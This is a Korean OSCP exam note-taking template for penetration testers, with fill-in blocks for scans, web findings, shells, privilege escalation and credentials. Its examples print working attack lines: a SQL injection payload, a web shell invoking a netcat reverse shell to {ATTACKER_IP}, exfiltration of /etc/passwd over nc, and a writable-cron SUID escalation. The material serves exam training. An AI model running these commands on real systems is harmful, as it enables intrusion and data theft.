# 📝 NOTE-TAKING TEMPLATE

> **목표: 시험 중 체계적이고 빠른 정보 기록으로 놓치는 것 없이 진행**

## ⚡ 즉시 사용할 템플릿들

### 🎯 기본 타겟 템플릿 (복사-붙여넣기용)

```
=== TARGET: {IP} ===
Start Time: {YYYY-MM-DD HH:MM}
OS:
Domain:

=== PORTS & SERVICES ===
[PORT] [SERVICE] [VERSION] [STATUS] [NOTES]


=== WEB SERVICES ===
URL:
Technology:
Directories Found:
Files Found:
Credentials Found:

=== VULNERABILITIES ===
[SEVERITY] [SERVICE] [CVE/VULN] [EXPLOIT] [STATUS]


=== SHELLS ===
Type:
User:
IP:PORT:
Command:
Upgrade:

=== PRIVILEGE ESCALATION ===
Method:
User:
Evidence:
Command:

=== CREDENTIALS ===
[SERVICE] [USERNAME] [PASSWORD] [HASH] [STATUS]


=== PROOF ===
User Flag:
Root Flag:
Screenshots:
Time Completed:
```

### 🔍 포트 스캔 결과 템플릿

```
=== NMAP SCAN RESULTS ===
Command: nmap -sC -sV -oA initial {IP}
Date: {DATE}

OPEN PORTS:
{PORT}/tcp  {SERVICE}  {VERSION}


INTERESTING FINDINGS:
-
-
-

NEXT STEPS:
1.
2.
3.
```

### 🌐 웹 서비스 조사 템플릿

```
=== WEB SERVICE: {URL} ===
Server:
Framework:
Languages:

DIRECTORIES:
- /admin
- /uploads
- /config

FILES:
- robots.txt:
- sitemap.xml:
- .htaccess:

PARAMETERS FOUND:
- id=
- user=
- file=

VULNERABILITIES TESTED:
[ ] SQL Injection
[ ] XSS
[ ] LFI/RFI
[ ] File Upload
[ ] Command Injection
[ ] Directory Traversal

CREDENTIALS FOUND:
-
```

---

## 📋 단계별 노트 정리 체크리스트

### 🎬 시험 시작시 (5분)

- [ ] **기본 타겟 템플릿 생성** (위 템플릿 복사)
- [ ] **시작 시간 기록**
- [ ] **타겟 IP 입력**
- [ ] **스크린샷 폴더 생성**

### 🔍 정찰 단계 (30분)

- [ ] **nmap 명령어와 결과 기록**
- [ ] **발견된 모든 포트/서비스 기록**
- [ ] **각 서비스 버전 정보 기록**
- [ ] **흥미로운 발견사항 하이라이트**
- [ ] **다음 단계 우선순위 기록**

### 🎯 공격 단계 (진행중)

- [ ] **시도한 모든 공격 벡터 기록**
- [ ] **사용한 명령어 기록** (재현 가능하도록)
- [ ] **실패한 시도도 기록** (나중에 다시 시도 방지)
- [ ] **발견한 크레덴셜 즉시 기록**
- [ ] **중요한 파일/디렉토리 위치 기록**

### 🐚 쉘 획득 후 (즉시)

- [ ] **쉘 타입과 사용자 기록**
- [ ] **쉘 획득 명령어 기록**
- [ ] **쉘 안정화 명령어 실행 및 기록**
- [ ] **기본 시스템 정보 수집 및 기록**
- [ ] **권한상승 벡터 조사 시작**

### 🔺 권한상승 단계

- [ ] **시도한 모든 방법 기록**
- [ ] **발견한 SUID/권한 정보 기록**
- [ ] **성공한 익스플로잇 명령어 기록**
- [ ] **루트 쉘 획득 증명 기록**

### 📸 증명 수집

- [ ] **사용자 플래그 스크린샷**
- [ ] **루트 플래그 스크린샷**
- [ ] **권한 증명 스크린샷** (id, whoami)
- [ ] **중요 명령어 실행 스크린샷**
- [ ] **완료 시간 기록**

---

## 🎯 상황별 노트 구조

### 🌐 웹 애플리케이션 공격시

```
=== WEB ATTACK: {URL} ===
Target: {URL}/vulnerable_page.php?id=1

DISCOVERY:
Parameter: id
Method: GET/POST
Initial Test: id=1'

EXPLOITATION:
Vulnerability: SQL Injection
Payload: ' UNION SELECT 1,2,3--
Database: MySQL
Tables Found: users, admin
Data Extracted:
- admin:password123
- user:secret456

FILES UPLOADED:
- shell.php → /uploads/shell.php
- Access: http://{IP}/uploads/shell.php

SHELL COMMAND:
nc -lvnp 4444
curl http://{IP}/uploads/shell.php?cmd=nc%20{ATTACKER_IP}%204444%20-e%20/bin/bash
```

### 🗂️ SMB 공격시

```
=== SMB ATTACK: {IP}:445 ===
ENUMERATION:
- smbclient -L //{IP} -N
- Shares Found: ADMIN$, C$, shared, backup

ACCESS:
Share: backup
Command: smbclient //{IP}/backup -N
Files Found:
- passwords.txt
- backup.zip
- config.xml

CREDENTIALS EXTRACTED:
- service_account:P@ssw0rd123
- admin:admin123

LATERAL MOVEMENT:
psexec.py service_account:P@ssw0rd123@{IP}
```

### 🔺 권한상승 시도시

```
=== PRIVILEGE ESCALATION: {IP} ===
Current User: www-data
OS: Linux Ubuntu 18.04

ENUMERATION COMPLETED:
[ ] LinPEAS: /tmp/linpeas.sh
[ ] SUID Files: find / -perm -4000 -type f 2>/dev/null
[ ] Sudo: sudo -l
[ ] Cron: cat /etc/crontab
[ ] Services: ps aux

VULNERABILITIES FOUND:
1. SUID Binary: /usr/bin/custom_app
   - Analysis: strings /usr/bin/custom_app
   - Exploit: Buffer Overflow in parameter

2. Cronjob: */5 * * * * root /opt/cleanup.sh
   - Writable: ls -la /opt/cleanup.sh
   - Exploit: echo 'chmod +s /bin/bash' >> /opt/cleanup.sh

SUCCESSFUL EXPLOIT:
Method: Writable script in cron
Command: echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
Wait: 5 minutes
Escalate: /bin/bash -p
Result: root
```

### 💾 파일 전송 기록

```
=== FILE TRANSFERS ===
UPLOAD TO TARGET:
- linpeas.sh: python3 -m http.server 8000 → wget http://{ATTACKER_IP}:8000/linpeas.sh
- nc.exe: impacket-smbserver share $(pwd) → copy \\{ATTACKER_IP}\share\nc.exe
- payload.php: curl -X POST -F "file=@payload.php" http://{IP}/upload.php

DOWNLOAD FROM TARGET:
- /etc/passwd: cat /etc/passwd | nc {ATTACKER_IP} 4444
- database.db: python3 -m http.server 8000 → wget http://{IP}:8000/database.db
- backup.zip: smbclient //{IP}/share -N → get backup.zip
```

---

## 🚨 문제 해결

### 📝 노트가 복잡해질 때

```
ORGANIZATION TIPS:
1. 각 타겟마다 별도 파일 생성
2. 타임스탬프를 모든 항목에 추가
3. 색상 코딩 사용:
   - 빨강: 실패한 시도
   - 초록: 성공한 공격
   - 노랑: 추가 조사 필요
   - 파랑: 중요 정보

QUICK NAVIGATION:
=== BOOKMARK ===
- [INITIAL SCAN RESULTS]
- [WEB VULNERABILITIES]
- [SHELL ACCESS]
- [PRIVILEGE ESCALATION]
- [FLAGS FOUND]
```

### 🔍 정보를 놓쳤을 때

```
RECOVERY CHECKLIST:
[ ] 터미널 히스토리 확인: history
[ ] nmap 출력 파일 재확인: cat *.nmap
[ ] 브라우저 히스토리 확인
[ ] 스크린샷 폴더 확인
[ ] 임시 다운로드 폴더 확인

COMMAND HISTORY RECOVERY:
# Bash history
cat ~/.bash_history | grep {IP}

# Nmap scan files
find . -name "*.nmap" -exec cat {} \;

# Recently modified files
find . -mmin -60 -type f
```

### ⏰ 시간이 부족할 때

```
PRIORITY NOTES:
1. 성공한 익스플로잇 명령어만 기록
2. 플래그 위치와 내용 기록
3. 핵심 스크린샷만 촬영
4. 상세 분석은 나중에, 결과만 기록

MINIMAL TEMPLATE:
Target: {IP}
Exploit: {COMMAND}
User Shell: {USER}@{IP}
Root Method: {METHOD}
Flags: user.txt={FLAG}, root.txt={FLAG}
Screenshots: ✓
```

### 📸 스크린샷 관리

```
SCREENSHOT ORGANIZATION:
mkdir screenshots/{IP}
cd screenshots/{IP}

NAMING CONVENTION:
01-nmap-scan.png
02-web-enum.png
03-sqli-proof.png
04-shell-user.png
05-privesc-enum.png
06-root-shell.png
07-user-flag.png
08-root-flag.png

AUTOMATED SCREENSHOTS:
# Current terminal
gnome-screenshot -w

# Specific window
gnome-screenshot -f screenshot.png

# With timestamp
gnome-screenshot -f $(date +%H%M%S)-proof.png
```

### 🔄 백업 및 동기화

```
BACKUP COMMANDS:
# 노트 백업
cp notes.txt notes-backup-$(date +%H%M).txt

# 전체 작업 폴더 압축
tar -czf oscp-work-$(date +%H%M).tar.gz .

# 중요 파일만 백업
cp *.nmap *.txt *.png backup/

# 실시간 동기화 (외부 저장소)
rsync -av . backup@server:/backup/oscp/
```

---

## 📊 시간별 노트 정리 가이드

### ⏰ 매 30분마다

- [ ] **현재 진행 상황 요약 작성**
- [ ] **다음 30분 목표 설정**
- [ ] **중요 발견사항 하이라이트**
- [ ] **백업 생성**

### 🎯 각 단계 완료시

- [ ] **해당 단계 완료 표시**
- [ ] **사용한 핵심 명령어 정리**
- [ ] **다음 단계 계획 수립**
- [ ] **증명 스크린샷 촬영**

### 📝 시험 종료 전

- [ ] **모든 플래그 재확인**
- [ ] **스크린샷 완성도 확인**
- [ ] **보고서 작성용 정보 정리**
- [ ] **최종 백업 생성**

---

## 🎯 성공적인 노트 정리의 핵심

### ✅ 좋은 노트의 특징

- **즉시 기록**: 발견 즉시 기록, 나중에 정리하지 말기
- **명령어 중심**: 재현 가능한 명령어 위주로 기록
- **타임스탬프**: 모든 중요 발견에 시간 기록
- **스크린샷**: 중요한 순간은 반드시 스크린샷

### 🚫 피해야 할 실수들

- 머릿속으로만 기억하고 기록 안하기
- 실패한 시도 기록 안하기 (같은 실수 반복)
- 플래그 발견 후 스크린샷 안찍기
- 백업 없이 진행하기

**다음 단계**: 노트 정리와 함께 실제 공격을 위해 `PORT-ATTACKS/` 파일들로 이동!
